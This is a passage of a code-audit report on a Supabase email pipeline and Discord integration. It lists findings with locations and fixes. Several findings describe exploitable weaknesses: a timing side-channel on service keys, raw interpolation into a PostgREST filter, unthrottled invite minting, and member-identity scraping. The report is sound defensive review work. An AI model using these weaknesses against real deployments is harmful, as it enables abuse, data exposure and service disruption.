- **What breaks:** Verified: moveToDlq inserts the 'dlq' email_send_log row (80) and write_audit_log (89) first, then calls move_to_dlq last (97); its error is only logged (104) and control returns to the caller which does `continue`. If move_to_dlq consistently fails (RPC/permission issue), the message remains visible in pgmq, is re-read after VT, re-hits the TTL/max-retry branch, and re-inserts another 'dlq' log row + re-emits audit every tick — a growing pile of duplicate dlq rows and audit noise for one stuck message, while operators see 'dlq' status for a message that is actually still live and may still send.
- **Smallest fix:** Archive first (or in one transaction); write the dlq log row + audit only after the archive succeeds, and stop reprocessing the message if archival fails (extend VT / mark it).

### [Medium] audit.ts promises a security-event throttle exemption that does not exist — error/security audit rows are dropped under load  `error-handling` (CONFIRMED)
- **Where:** _shared/audit.ts:113 (comment: 'skip for known-low-volume security events') vs 83-102 shouldEmit + 105-137 auditEdgeEvent (no severity/security allowlist anywhere; every event goes through cap + dedup)
- **What breaks:** Verified: auditEdgeEvent's comment at line 113 claims caps/dedup are skipped for security events, but shouldEmit (83) is called unconditionally for every event (line 115) and contains no severity or event-type exemption. So even absent audit-pressure, error and security events are subject to the 30/min default cap (DEFAULT_CAP line 37) and 30s fingerprint dedup (line 38); during an incident that emits many similar errors, the dedup fingerprint (event::fn::errorMsg-or-recordId, line 114) plus the per-minute cap silently drop error/security audit rows. Combined with pressureMul (finding above) cutting caps to 10%, the audit trail thins exactly when it matters. The comment is a latent lie that will mislead the next maintainer into thinking security events are protected.
- **Smallest fix:** Implement the promised allowlist: exempt high-severity/security event types (e.g. severity==='error' or a security event set) from both pressureMul and the per-minute cap in shouldEmit, and make the comment match the code.
- _added-in-verification_

### [Medium] replay-email-dlq escalation path loops admin notifications forever if archiveDelete fails after escalate  `error-handling` (CONFIRMED)
- **Where:** replay-email-dlq/index.ts:99-104 (gen>=3 → escalate THEN archiveDelete) with the shared per-message catch at 113-114 (empty, stats.failed++)
- **What breaks:** Verified: for a row at gen>=3, escalate (notify_admins_email_dlq_escalation, line 100) runs before archiveDelete (101). If archiveDelete throws (RPC/permission error) — or if escalate succeeds but archiveDelete then fails — the catch at 113 swallows it and the archive row survives. Every 5 minutes the cron re-reads it, calls escalate again, and re-inserts an admin notification + audit row, forever: a poison row that has exhausted replays becomes a permanent admin-notification storm with no log line (empty catch). Symmetric to finding #4 but on the escalation branch.
- **Smallest fix:** archiveDelete before (or atomically with) escalate, log the caught error, and de-dupe escalations by message id so a row cannot re-notify on every tick.
- _added-in-verification_

### [Medium] replay-email-dlq readArchive swallows all RPC errors and returns [] — a broken archive read silently no-ops the entire DLQ drain  `error-handling` (CONFIRMED)
- **Where:** replay-email-dlq/index.ts:30-41 (pgmq_read_archive error → `return [] as PgmqMessage[]` with only a comment, no log/audit) and 87-92 (outer catch also maps to empty stats)
- **What breaks:** Verified: readArchive treats any pgmq_read_archive error as 'archive RPC may not exist in older deploys' and returns an empty array (lines 36-39) with no log and no audit. If the RPC is renamed, loses grant, or errors transiently in production, every lane reports {replayed:0} and the function returns ok:true — DLQ messages are never drained, the archive grows unbounded, and there is zero signal that replay has stopped working. A deploy-time 'older deploys' guard silently doubles as a production outage mask.
- **Smallest fix:** Distinguish 'RPC missing' (log once, continue) from a real RPC error (log/audit + surface a non-ok status), so a broken archive read is visible instead of an infinite silent no-op.
- _added-in-verification_

### [Low] Workspace-quota 429 cross-lane attribution can freeze the auth lane — delaying login/OTP/password-reset emails  `other` (PLAUSIBLE)
- **Where:** process-email-queue/index.ts:632-680 (offenderLane = lastSentLane when isWorkspaceQuota && lastSentLane !== queue; cooldown written to offenderLane)
- **What breaks:** Verified the mechanism: on a workspace-scoped 429 (line 632), the cooldown is attributed to lastSentLane (634) — whichever lane last sent successfully — and a cooldown up to 120s is written to that lane (671-679). Lanes drain auth→transactional→bulk (245). If a later lane's FIRST send 429s before it has recorded its own success, lastSentLane is still the prior lane, so an auth burst that exhausted the shared workspace quota can push the auth lane into cooldown. Auth emails (login codes, password resets, signup confirmations) are exactly the ones that must not be delayed. PLAUSIBLE because it requires the 429 to land on a lane's first send of the tick (once a lane sends successfully, lastSentLane == queue and attribution stays local).
- **Smallest fix:** Never place the auth lane into cooldown via cross-lane attribution; on a shared-quota 429 rely on the workspace token bucket to pace and keep auth immediately eligible.

### [Low] email-dispatcher swallows gcExpired failure with .catch(()=>0) — GC breakage is invisible  `error-handling` (CONFIRMED)
- **Where:** email-dispatcher/index.ts:28 (`const expired = await outbox.gcExpired().catch(() => 0)`); pg-outbox-repo.ts:39-43 (gcExpired throws on gc_expired_email_outbox RPC error)
- **What breaks:** Verified: gcExpired throws on RPC error (pg-outbox-repo line 41), and the dispatcher maps any throw to 0 (line 28), then reports ok:true with expired:0 (line 30). gc_expired_email_outbox is what keeps stale 'pending' rows out of dashboards (comment line 27). If that RPC starts failing, stale pending rows accumulate and email-pipeline-health's stuck-pending probe fires with no indication the real cause is a broken GC. Recover/retry/report all absent — a pure swallow.
- **Smallest fix:** Log/audit the gcExpired error (report) before defaulting to 0, so a persistently failing GC surfaces instead of masquerading as stuck-pending alerts.

### [Low] Announcement email rendering is duplicated in replay-dlq-emails ('kept in sync with send-announcement-email') — guaranteed drift  `under-engineering` (CONFIRMED)
- **Where:** replay-dlq-emails/index.ts:66-223 (URL_RE/EMAIL_RE, escHtml/escAttr, linkifyTextNode, renderAnnouncementEmail copied; comment at line 66 admits 'kept in sync with send-announcement-email')
- **What breaks:** Verified: ~150 lines of linkify/escape/inline-styling plus the full HTML template are a second hand-synced copy of the sender's logic (comment line 66). When the canonical announcement template changes (styles, unsubscribe copy, link handling), replays silently send stale or divergent HTML, and any escaping/XSS fix in one copy won't reach the other — the 'agent copies it, now there are two' drift the repo rules warn against.
- **Smallest fix:** Extract renderAnnouncementEmail into a shared module imported by both send-announcement-email and replay-dlq-emails so there is one renderer.

### [Low] Two overlapping DLQ replayers with confusingly similar names read different DLQ stores  `boundary` (CONFIRMED)
- **Where:** replay-email-dlq/index.ts (cron, all lanes, reads pgmq archive via pgmq_read_archive at line 32) vs replay-dlq-emails/index.ts (admin JWT, announcement-only, reads email_send_log status='dlq' at 281-296); both call enqueueLegacyPayloadV2
- **What breaks:** Verified: 'replay-email-dlq' and 'replay-dlq-emails' are near-identical names operating on different notions of 'the DLQ' (pgmq archive vs an email_send_log status) with different auth models (service-role cron vs admin JWT). Both funnel into enqueueLegacyPayloadV2 → email_outbox, so their effects overlap with no coordination on what was already replayed. An operator will invoke the wrong one; a maintainer will patch one and assume both are covered.
- **Smallest fix:** Rename to reflect their stores (e.g. replay-pgmq-archive vs admin-replay-announcement-dlq), document which DLQ each owns, and consider consolidating onto a single DLQ concept.

### [Low] record_workspace_email_success double-wrapped in try/catch on top of safeRpc's own catch — patch-on-patch  `over-engineering` (CONFIRMED)
- **Where:** process-email-queue/index.ts:573-577 (try/catch around safeRpc) wrapping safeRpc at 48-59 which already try/catches internally
- **What breaks:** Verified: safeRpc (48-59) cannot throw — it try/catches the rpc call and even stringifies caught errors. Wrapping the call in a second try/catch (573-577) 'in case the helper itself ever regresses' (comment cites the 2026-06-05 incident) is defensive cargo-culting: it adds noise and signals distrust of a shared helper rather than fixing/testing it. Harmless at runtime but exactly the accreted patch the architecture rules say to refactor away.
- **Smallest fix:** Trust safeRpc (it cannot throw) and remove the outer try/catch; if the concern is real, add a test to safeRpc instead.

---

## Edge: Email pipeline (part 2/2 — send, suppression & webhooks)

### [High] Announcement one-click unsubscribe ships tokens that are never persisted → every unsubscribe 404s (RFC 8058 broken)  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/send-announcement-email/index.ts:238 (mint) and :318-321 (insert); v2 path payload :340; legacy payload :382
- **What breaks:** Line 238 mints a fresh crypto.randomUUID() per recipient; lines 318-321 do a bare `insert({ email, token })` with NO onConflict and NO error check. transactional-email.ts:190-193/231-234 and resend-signup-confirmations:162-165 all upsert(onConflict:'email', ignoreDuplicates:true), proving a UNIQUE(email) constraint exists. So for every recipient who already has a token row (the entire ~1200-member list after the first send), this insert throws a unique-violation that is swallowed by the per-recipient try/catch at :387, yet the freshly-minted UNPERSISTED token is still put in the payload (:340/:382) and thus the outgoing List-Unsubscribe header. Gmail/Apple one-click POSTs that token; handle-email-unsubscribe/index.ts:66 finds no matching row → 404 'Invalid or expired token'. One-click unsubscribe is broken for the whole membership on every announcement — the exact RFC 8058 signal Gmail/Yahoo require of bulk senders, whose absence pushes the domain toward spam.
- **Smallest fix:** Reuse the existing token via upsert(onConflict:'email', ignoreDuplicates:true) then re-read the persisted token (as transactional-email.ts:resolveUnsubscribeToken does) and put THAT token in the payload; check the write error before enqueuing.
- _Verified against transactional-email.ts upsert pattern and handle-email-unsubscribe 404 branch._

### [High] handle-email-suppression maps reason:'unsubscribe' to a GLOBAL suppressed_emails row — the ADR-0018 account-email lockout it explicitly forbids  `security` (CONFIRMED)
- **Where:** supabase/functions/handle-email-suppression/index.ts:10 (payload allows 'unsubscribe'), :88-97 (upsert), :140-150 (mapReasonToStatus default→'suppressed')
- **What breaks:** The function upserts ANY inbound reason — including reason:'unsubscribe' — into suppressed_emails (:88-97), a GLOBAL block. transactional-email.ts:406-441 refuses to send to ANY address in suppressed_emails, and that check runs before/independent of the tier gate — so it blocks Tier-0 critical mail (password resets, interview invites) too. handle-email-unsubscribe/index.ts:100-108 documents the opposite invariant (ADR-0018): an unsubscribe turns off ONLY the Tier-1 opt-out and NEVER adds a global suppressed_emails row. If the upstream Go API emits an 'unsubscribe' suppression event (the payload type at :10 explicitly allows it), a member who merely unsubscribed from announcements is globally locked out of account-recovery email — a dead end. Two functions encode contradictory suppression semantics for the same table.
- **Smallest fix:** Never write suppressed_emails for reason:'unsubscribe' here; route unsubscribe through the scope-aware RPC set_email_opportunities_unsubscribed like handle-email-unsubscribe. Only hard bounce/complaint may globally suppress.
- _Confirmed suppressed_emails is a hard global gate in transactional-email.ts:406-441 (blocks before tier logic)._

### [High] Unsubscribe burns its single-use token BEFORE applying the preference — RPC failure leaves user un-unsubscribed AND unable to retry  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/handle-email-unsubscribe/index.ts:81-113
- **What breaks:** The atomic update sets used_at (:81-87) and commits, THEN calls rpc('set_email_opportunities_unsubscribed') (:106). If the RPC errors (:110), the function returns 500 but the token is already consumed with no rollback. The opportunities opt-out was NOT applied, so the user keeps receiving the emails. Any retry — including Gmail's automatic one-click retry — hits the used_at branch (:70) and returns 'already_unsubscribed', so the preference can NEVER be applied through this token. Half-committed state: the user believes they unsubscribed, the system disagrees, and there is no reconciliation path short of minting a new token in a fresh email.
- **Smallest fix:** Apply the (idempotent) preference RPC first, and only mark used_at after it succeeds; or wrap both in a single DB function so they commit atomically.

### [High] eo-contact-status 500s on any Email Octopus (or auth) hiccup despite documenting 'never hard-fails'  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/eo-contact-status/status-core.ts:30; index.ts:27-63 (bare Deno.serve, fetchStatus at :60, getUserId at :43-45)
- **What breaks:** The header comment (index.ts:8-9) promises: 'Never hard-fails: any EO problem returns {status:"unknown"} and the client falls back to the cached mirror.' But status-core.ts:30 does `return { status: await deps.fetchStatus(email), http: 200 }` with NO try/catch, and index.ts wires fetchStatus to fetchContactStatus(cfg!, email) (:60) inside a bare Deno.serve handler (:27) with no try/catch anywhere. When EO times out or network-errors (its normal failure mode) the promise rejects, the handler throws, and the client gets an unhandled 500 — not the documented {status:'unknown'} at HTTP 200. Same defect on the auth path: getUserId's authClient.auth.getUser() (:43-45) is also unguarded, so a GoTrue hiccup 500s too. The advertised graceful degradation does not exist; the marketing-status UI breaks exactly when EO/GoTrue is flaky.
- **Smallest fix:** Wrap fetchStatus (and getUserId) in try/catch in status-core and return {status:'unknown', reason:'eo_error', http:200} on failure — the exact contract the comment claims.
- _Broadened: getUserId's getUser() call is equally unguarded and will also 500._

### [High] Announcement blaster: per-recipient feature-flag N+1 + source-dedup bypass → times out mid-blast; retry safety rests entirely on an unverified downstream RPC  `boundary` (CONFIRMED)
- **Where:** supabase/functions/send-announcement-email/index.ts:226-390 (loop), :328 isV2Enabled per-recipient, :348-354 & :364-370 unchecked log inserts, :372-385 legacy enqueue
- **What breaks:** The loop iterates every opted-in profile (~1200 per the code's own comments) inside ONE edge invocation, and for EACH recipient it (a) inserts a token, (b) calls isV2Enabled(adminClient,'bulk') — which composition.ts:45-52 confirms is a fresh `select ... from email_send_state` DB round-trip for a value that cannot change during the loop (N+1: ~1200 needless queries), (c) enqueues, (d) inserts email_send_log. Thousands of sequential awaits under an edge wall-clock/CPU cap: a large blast times out partway. The LEGACY path (:364-385) inserts an append-only email_send_log 'pending' row (cannot dedup) and calls enqueueLegacyPayloadV2 — it entirely bypasses queueTransactionalEmail's source-level dedup guard (transactional-email.ts:498-533). Retry-safety therefore rests SOLELY on enqueue_email_v2 honoring the deterministic p_idempotency_key; if that RPC does not dedup, a timeout+retry re-emails every already-sent recipient.
- **Smallest fix:** Hoist isV2Enabled out of the loop; enqueue in batched inserts; gate the whole send on an announcements.email_sent_at guard plus a source-level per-recipient dedup check mirroring transactional-email.ts, so a retry is a true no-op independent of the downstream RPC.
- _N+1 and source-dedup bypass CONFIRMED in code; the re-blast outcome depends on enqueue_email_v2's idempotency, which is downstream of this section._

### [High] Announcement recipient query has no pagination — PostgREST's default 1000-row cap silently truncates a ~1200-member blast  `under-engineering` (PLAUSIBLE)
- **Where:** supabase/functions/send-announcement-email/index.ts:199-213
- **What breaks:** The recipient query `.from('profiles').select('email').eq('notify_opportunities', true).neq('email','')` has no .range()/.limit() and no pagination loop. PostgREST (Supabase) enforces a default db-max-rows cap (1000 unless raised project-wide), so this returns AT MOST ~1000 rows. The code's own comments (:196) state the opted-in list is ~1200+ of ~1253 members. Every announcement therefore silently emails only the first ~1000 recipients; the response reports total_recipients as that truncated count (:458), so no one notices the ~200+ members who never received it. This is the same 'silently reached only ~163 members' class of failure the function was rewritten to fix — reintroduced via an unbounded single-page query.
- **Smallest fix:** Paginate with .range() in a loop (or an explicit high .limit() with a count assertion) until all opted-in profiles are fetched; assert fetched count against a COUNT(*) so truncation fails loudly instead of silently.
- _added-in-verification. Severity depends on the project's db-max-rows setting; default Supabase config makes this a live silent truncation, hence PLAUSIBLE-High._

### [Medium] No 'already sent' guard on the announcement send — double-click / concurrent admin invoke re-blasts ~1200 members  `ownership` (CONFIRMED)
- **Where:** supabase/functions/send-announcement-email/index.ts:160-224
- **What breaks:** The function fetches the announcement (:160) and proceeds straight to the blast (:222); the only write to the announcements row is marketing_attested_at/by (:188-191), which is never read as a sent-guard. Two admins (or one double-click, or a client retry after a slow response) invoking the same announcement_id both run the full loop. Because the legacy path has no source-level dedup, each invocation is a fresh full blast subject only to unverified downstream dedup. There is no single owner of the fact 'this announcement was already emailed.'
- **Smallest fix:** Add announcements.email_sent_at; set it in a conditional UPDATE ... WHERE email_sent_at IS NULL and abort the send if it affects zero rows (single-owner claim of the send).

### [Medium] Service-key / API-key checks use non-constant-time string comparison, bypassing the repo's own timing-safe helper  `security` (CONFIRMED)
- **Where:** send-transactional-email/index.ts:23; resend-signup-confirmations/index.ts:45; preview-transactional-email/index.ts:34
- **What breaks:** All three compare the bearer token to the secret with plain `!==` (`authHeader !== 'Bearer '+serviceKey`, `token !== serviceRoleKey`, `token !== apiKey`). _shared/service-role-auth.ts:20-28 exists specifically to avoid this (timingSafeEqualStr, added per 'audit C1'), and send-application-confirmation/index.ts:21,155 correctly uses authorizeServiceRoleRequest. These three do not, reintroducing a timing side-channel on SUPABASE_SERVICE_ROLE_KEY / LOVABLE_API_KEY. send-transactional-email is the internal fan-in for many callers; a leaked service-role key is total DB compromise.
- **Smallest fix:** Replace the direct comparisons with authorizeServiceRoleRequest / timingSafeEqualStr from _shared/service-role-auth.ts.
- _Verified helper exists and is used correctly by send-application-confirmation; these three diverge._

### [Medium] Signup safety-net sends at most ONE reminder per 6h globally — the '10-minute reminder' promise collapses under any signup volume  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/resend-signup-confirmations/index.ts:17-26, :256-261
- **What breaks:** MAX_PER_CYCLE=1 (:26) caps the entire platform to one safety-net reminder per cron tick, and the loop `break`s at :256-261 after the first send; the cron runs every 6h. If 30 users sign up in a window and don't confirm, only one gets a reminder every 6 hours; the rest wait a day or more, past the 14-day HARD_CUTOFF for later entrants during a surge. REMINDER_AFTER_MINUTES=10 (:17) advertises near-immediate recovery the throttle makes impossible. At 767 users and growing, a cohort-launch spike means most unconfirmed users never get the recovery email this whole function exists to send.
- **Smallest fix:** Raise MAX_PER_CYCLE to a burst the per-second quota tolerates (spacing sends within the tick), or shorten the cron interval; make the cap proportional to backlog size rather than a hard 1.

### [Medium] Signup reminder bookkeeping writes are unchecked — a failed reminder-log insert re-reminds the same user indefinitely  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/resend-signup-confirmations/index.ts:197-202 (pending log), :249-253 (reminder history)
- **What breaks:** The reminder-history insert (:249-253) and the 'pending' email_send_log insert (:197-202) are not error-checked. The dedup/frequency logic (:93-111) counts rows in signup_confirmation_reminders and reads the latest sent_at to enforce MAX_REMINDERS_PER_USER and the 30-min gap. If the :249 insert silently fails after the email is already enqueued, the count never increments and no gap row appears, so the same user re-qualifies every cycle — repeatedly — bounded only by the 14-day cutoff. The user gets a stream of duplicate confirmation emails, and MAX_REMINDERS_PER_USER=4 is never reached.
- **Smallest fix:** Check the history insert error; if it fails, treat the send as not-recorded (don't count it) and alert, or write the history row transactionally with the enqueue.

### [Medium] suppressed_emails has two independent writers with divergent reason vocabularies — dual ownership / last-write-wins drift  `ownership` (CONFIRMED)
- **Where:** supabase/functions/resend-webhook/index.ts:100-102 vs supabase/functions/handle-email-suppression/index.ts:88-97
- **What breaks:** resend-webhook (Svix-verified, only writes reason bounce/complaint) and handle-email-suppression (Lovable-HMAC-verified, writes bounce/complaint/unsubscribe) both upsert suppressed_emails with onConflict:'email' but different reason enums and metadata shapes. resend-webhook's header (index.ts:1-6) declares it 'replaces the dead Lovable/Mailgun handle-email-suppression' — yet that function is still present and still @edge-public (deployable/reachable). Either it is dead code that should be deleted, or it is a live second writer whose last-write-wins upsert can OVERWRITE a hard-bounce reason/metadata with a softer 'unsubscribe', corrupting the deliverability picture and the auto-pause signals (refresh-email-health) that read this table.
- **Smallest fix:** Delete handle-email-suppression if Mailgun/Lovable is retired; if kept, make one function the sole writer and have the other forward to it.

### [Medium] send-transactional-email accepts an unvalidated passthrough body and makes idempotency optional → retries double-send  `under-engineering` (CONFIRMED)
- **Where:** send-transactional-email/index.ts:7, :41-44; _shared/transactional-email.ts:294, :404, :498-533
- **What breaks:** BodySchema is z.object({}).passthrough() (:7) — no field is validated; templateName/recipientEmail/templateData are read raw (:41-47) and forwarded into React email rendering. idempotencyKey falls back to messageId (:44), which in queueTransactionalEmail falls back to a fresh crypto.randomUUID() (transactional-email.ts:294). Any internal caller that retries without a stable key gets a brand-new messageId each attempt, so the source-level dedup guard (transactional-email.ts:498-533, which keys on message_id) never matches and the recipient receives duplicates — the exact bug class the 'Audit H8' message-id work was created to fix, left unenforced at this entrypoint.
- **Smallest fix:** Require a non-empty idempotencyKey/messageId (400 if absent) and validate recipientEmail shape in BodySchema.

### [Medium] Announcement email_send_log 'pending' insert is unchecked after enqueue — delivered-but-unlogged blind spot in reconciliation & health  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/send-announcement-email/index.ts:348-354 (v2 path) and :364-370 (legacy path)
- **What breaks:** Both the v2 (:348-354) and legacy (:364-370) branches insert the email_send_log 'pending' row with no error check, and in the legacy branch the log insert happens BEFORE enqueueLegacyPayloadV2 while the v2 branch inserts AFTER enqueueEmail. If the log write fails but the enqueue/send succeeds, the email is delivered with NO durable 'pending' row keyed to its message_id. reconcile-stuck-emails / email-pipeline-health / the source dedup guard all key off email_send_log by message_id, so that send is invisible to reconciliation and to any later dedup — and a retry cannot recognize it as already-sent. The append-only log is the ownership record of 'we tried to send X'; an unchecked write quietly drops that fact.
- **Smallest fix:** Check the email_send_log insert error; on failure treat the recipient as not-durably-recorded (log/alert, and do not count as enqueued), or write the log row before the enqueue and gate the enqueue on its success.
- _added-in-verification. Mirrors the resend-signup-confirmations unchecked-bookkeeping finding but on the announcement lane._

### [Low] Marketing attestation is recorded before the send and never rolled back on failure  `ownership` (CONFIRMED)
- **Where:** supabase/functions/send-announcement-email/index.ts:188-211
- **What breaks:** announcements.marketing_attested_at/by are written (:188-191) before recipients are even fetched (:199). If the profiles query then fails (:205→500) or the blast enqueues zero, the compliance record still says this admin attested-and-sent, decoupling the audit trail from whether anything went out. There is also no WHERE guard, so a re-invoke overwrites the original attester. The attestation fact and the send fact drift.
- **Smallest fix:** Record the attestation only after a successful send (or store it alongside email_sent_at in the same conditional update).

### [Low] Announcement Discord cross-post fires even when zero emails were enqueued  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/send-announcement-email/index.ts:387-453
- **What breaks:** enqueued can be 0 (every per-recipient try/catch at :387-389 swallowed a failure to console.error, e.g. the token-insert unique violations above), yet control still reaches the Discord block (:392) and @-mentions role 1083439364975112293 in #platform-updates announcing an update no member received by email. The channel ping implies a delivery that didn't happen, and the swallowed per-recipient failures raise no report/alert.
- **Smallest fix:** Only cross-post when enqueued > 0, or annotate the Discord message / raise an alert when enqueued < total_recipients.

### [Low] validate-email-domain catch-all fail-open masks non-DNS bugs, not just DoH outages  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/validate-email-domain/index.ts:34-62
- **What breaks:** The catch (:54-58) returns {valid:true} for ANY thrown error, but the try wraps more than the DNS lookup: parseJsonBody (:35, throws on oversized/invalid body) and any future logic error land here and are reported as a valid domain. The 'fail open is intentional for DNS' rationale silently covers unrelated failures, so real bugs surface as 'domain OK' with only a warn log, degrading the signup domain gate unnoticed. checkEmailDomain already returns its own dns_fail_open branch, so DNS soft-fail does not need this outer catch.
- **Smallest fix:** Scope fail-open to the DNS call (rely on checkEmailDomain's dns_fail_open); let body-parse/validation errors return a real 400 instead of valid:true.

### [Low] Announcement body_html is style-injected and re-stripped by two divergent hand-rolled HTML/entity parsers with a manual cross-boundary sync obligation  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/send-announcement-email/index.ts:5, :245-277 (email) and :399-415 (Discord)
- **What breaks:** Only the title is escaped (escHtml, :289); body_html is passed through linkifyHtml + a long chain of regex tag rewrites into the email (:245-277), and SEPARATELY through a second hand-rolled tag-strip + numeric/entity decoder for Discord (:399-415). Two divergent regex parsers plus a comment at line 5 declaring it 'kept in-sync with src/lib/linkify.ts' — a manual sync obligation across the UI/edge boundary that will drift. Malformed or nested markup from the composer can produce broken formatting or partial tags in the mail, and the two strippers guarantee the email and Discord renderings disagree over time. (Also: the Discord path at :399 dereferences announcement.body_html without a null guard; a null column throws — caught by the block's try, so Discord silently no-posts after emails already went.)
- **Smallest fix:** Extract one shared, tested HTML→email and HTML→plaintext transformer into _shared and import it in both the edge function and the UI, instead of maintaining parallel regex chains.

---

## Edge: Discord integration

### [High] Shared DISCORD_BOT_TOKEN is hammered unthrottled by user-callable endpoints — one abuser 429s every Discord feature  `boundary` (CONFIRMED)
- **Where:** generate-discord-invite/index.ts:129-144; resolve-discord-id/index.ts:255,270-337; manage-discord-roles/index.ts:166-171 (LIST)
- **What breaks:** Verified: generate-discord-invite (any JWT, no rate limit, 1 Discord POST per call), resolve-discord-id (any JWT, up to 8 sequential members/search calls per request — buildSearchQueries slices to 8, each a guild search), and manage-discord-roles LIST (any JWT, admin check is skipped for action==='list' at line 146) all call Discord with the SAME `Bot ${BOT_TOKEN}` and NO per-user throttle. Discord enforces a global per-bot rate limit, so sustained calls to ANY one of these by any of the ~767 users return 429 across ALL of them at once — invite generation, onboarding role assignment, username repair/backfill, and the public member-count refresh fail simultaneously. Self-inflicted DoS of the whole Discord surface from one low-privilege caller.
- **Smallest fix:** Add a per-user check_edge_rate_limit gate (as discord-interactions/underRateLimit already does) to generate-discord-invite, resolve-discord-id, and manage-discord-roles LIST before any Discord call; cap resolve-discord-id to 1-2 search queries.

### [High] False 'ONLY writer' invariant: three functions write discord_username; header comment lies about ownership  `ownership` (CONFIRMED)
- **Where:** discord-oauth-callback/index.ts:4-6,231-238; repair-discord-username/index.ts:139-142; backfill-discord-usernames/index.ts:118-121
- **What breaks:** Verified: discord-oauth-callback's header (lines 4-6) states it is 'the ONLY path that writes discord_user_id/discord_username/has_discord_account.' False for discord_username: repair-discord-username (line 139-142) and backfill-discord-usernames (line 118-121) both UPDATE profiles.discord_username directly. The callback binds identity.username from OAuth /users/@me; repair/backfill later overwrite it with member.user.username from the guild members endpoint — two different Discord source fields for the same column, no single owner. A future engineer trusting the invariant reasons wrongly about provenance, and the values silently drift on rename / dot-handle special-casing. (Note: the callback IS the sole writer of discord_user_id + has_discord_account; only the discord_username half of the claim is false — but that half is exactly the drifting field.)
- **Smallest fix:** Delete the false 'ONLY path' claim for discord_username, or route the discord_username write through one shared helper all three call; document that repair/backfill re-assert from the guild endpoint.

### [High] One-account guard interpolates identity.username raw into a PostgREST .or() filter — false-positive lockout (worsened by ilike wildcards) + latent injection  `security` (CONFIRMED)
- **Where:** discord-oauth-callback/index.ts:202-217 (.or(`discord_user_id.eq.${snowflake},discord_username.ilike.${identity.username}`))
- **What breaks:** Verified at line 207: identity.username (a Discord-controlled field) is string-concatenated into a PostgREST filter. Two live consequences: (1) Correctness/lockout — the .ilike. clause flags a match on ANY OTHER profile's discord_username as 'already linked elsewhere'. Worse than a plain collision: Discord usernames legally contain underscores, and in `ilike` `_` is a single-character wildcard, so a handle like `sarah_jones` matches `sarahxjones`, `sarah-jones`, etc. on someone else's row — permanently blocking a member from linking their own, correctly-owned account (409 already_linked). (2) Injection — a username carrying PostgREST metacharacters (comma/paren/*) changes the OR expression's structure; the charset is narrow today but future display/global-name rules make it fragile. The snowflake alone is the real unique key; the username clause adds only false positives and attack surface.
- **Smallest fix:** Drop the discord_username clause and match on snowflake only (it is unique per account and already enforced by the unique index), or pass an exact escaped value via .eq()/.filter() rather than string interpolation into .or().

### [High] generate-discord-invite: any authenticated user can mint unlimited real server invites  `boundary` (CONFIRMED)
- **Where:** generate-discord-invite/index.ts:99-144
- **What breaks:** Verified: the only gate is supabase.auth.getUser() (lines 103-113) — no admin check, no rate limit, no per-user quota. Each call POSTs to Discord with {max_age:604800, max_uses:1, unique:true} (lines 138-142), minting a genuine, fresh, live invite every time. One logged-in session scripted in a loop produces thousands of live invites: invite spam, ban-evasion links, defeats onboarding-invite gating, and drains the shared bot-token budget (finding 1). Nothing ties an invite back to the requester beyond an audit row.
- **Smallest fix:** Gate behind a per-user rate limit (a few invites/hour via check_edge_rate_limit) and/or reuse a single non-unique onboarding invite instead of minting a fresh unique one per call.

### [High] resolve-discord-id is a full guild-identity/PII scraper for any logged-in user  `security` (CONFIRMED)
- **Where:** resolve-discord-id/index.ts:224-253,270-337,433-442
- **What breaks:** Verified: both the direct-snowflake path (lines 224-253) and the fuzzy-search path (270-337, candidates built 433-442) return, per member, {id (snowflake), username, global_name, nick, avatar}, up to 10 candidates per query. There is NO check that the caller is resolving their OWN account — the only ownership-gated branch (confirm_user_id) is disabled under H11, but this read/search path is explicitly 'unaffected'. Any of ~767 authenticated users can iterate handles and harvest the guild's snowflake↔real-identity map (global_name/nick routinely carry real names). PII/member-directory disclosure via an endpoint whose stated purpose is only to help a user find their own account to link.
- **Smallest fix:** Return at most the single best-match candidate; strip global_name/nick/avatar unless the row belongs to the caller; rate-limit per user; deny/alert on bulk enumeration.

### [Medium] 403 (bot lacks permission) role-assign failures are queued for automatic retry of a non-recoverable error  `error-handling` (CONFIRMED)
- **Where:** manage-discord-roles/index.ts:282-304
- **What breaks:** Verified: on assign failure the code queues queue_discord_role_grant for every status except 404 (`if (status !== 404)`, line 289), which includes 403. A 403 here means the bot's role sits below the target role — a config problem that never self-heals. Queuing it makes the background processor re-attempt a grant that can never succeed, burning shared bot-token budget (feeds finding 1) and filling discord_role_grant_queue with permanently-failing rows. The user message even says 'Ensure the bot's role is higher…' yet the code still queues it as 'self-healing'. (The unbounded-forever loop is contingent on the queue processor's retry policy, but queuing a known-terminal 403 is wrong regardless.)
- **Smallest fix:** Only queue transient failures (429, 5xx); treat 403 like 404 as non-recoverable and surface it for manual fix instead of queuing.

### [Medium] Raw err.message returned to clients in 4 functions — inconsistent with discord-notify's OWASP A09 handling  `error-handling` (CONFIRMED)
- **Where:** discord-project-update/index.ts:237-238; generate-discord-invite/index.ts:223,236; manage-discord-roles/index.ts:385,403; resolve-discord-id/index.ts:490,509
- **What breaks:** Verified: each handler puts the raw thrown message into the 500 body — discord-project-update `jsonResponse({error: message},500)` (237-238); generate-discord-invite (message built 223, returned 236); manage-discord-roles (385/403); resolve-discord-id (490/509). By contrast discord-notify (index.ts:157-158) deliberately returns 'An unexpected error occurred' citing OWASP A09. Postgres error text (table/column/constraint names), config strings, and dependency stack fragments leak to the browser from four endpoints; malformed-input probing yields internal schema/infra detail for free.
- **Smallest fix:** Return a generic message + a trace id and keep err.message in server logs only, matching discord-notify.

### [Medium] /fleety per-user rate limiter fails OPEN — cost/DoS exposure when the RPC is missing or DB is stressed  `error-handling` (CONFIRMED)
- **Where:** discord-interactions/index.ts:65-85
- **What breaks:** Verified: underRateLimit returns true (allowed) on ANY rpc error (`if (error) return true`, line 80) and in the catch (line 82-84). Given TFN's documented history of hand-applied prod migrations silently breaking RPCs (PGRST202 'function not found'), if check_edge_rate_limit isn't deployed the per-user limit becomes a no-op and every /fleety reaches the expensive techfleet-chat 2.0 brain unbounded. A single abuser or a broken migration drains the shared LLM budget and degrades Fleety for the whole server — invisibly, because the deferred response already returned.
